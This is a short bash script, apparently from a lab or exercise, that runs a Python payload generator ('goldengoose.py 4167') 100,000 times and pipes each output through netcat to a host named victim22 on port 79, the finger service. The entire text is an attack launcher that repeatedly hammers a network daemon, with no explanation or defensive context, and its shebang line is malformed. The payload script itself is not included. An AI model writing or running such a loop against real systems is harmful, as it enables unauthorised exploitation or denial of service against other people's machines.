!/bin/bash
END=100000
for ((i=1;i<=END;i++));
do
   python3 goldengoose.py 4167 | nc victim22 79
done

